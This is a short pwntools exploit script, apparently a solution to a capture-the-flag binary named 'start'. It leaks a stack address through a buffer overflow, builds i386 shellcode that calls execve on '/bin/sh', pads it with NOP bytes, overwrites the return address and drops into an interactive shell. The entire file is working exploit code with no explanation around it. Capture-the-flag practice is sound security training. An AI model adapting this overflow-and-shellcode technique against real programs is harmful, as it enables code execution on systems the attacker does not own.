from pwn import *


p = process("./start")

#gdb.attach(p,"b*0x08048087")

p.send("/bin/sh"+"\x00"*13 + p32(0x08048087))

p.recvuntil("CTF:")
leak = u32(p.recv(4))
ret = leak-4
binsh = leak-28

print "leak " + hex(leak)

shellcode = "mov eax,11;xor ecx,ecx;xor edx,edx;mov ebx,0x%x;int 0x80;" %binsh
payload = asm(shellcode,arch="i386")
print "len shellcode : " + str(len(payload))
payload += (20-len(payload))*'\x90'
payload += p32(ret)
p.send(payload)


p.interactive()
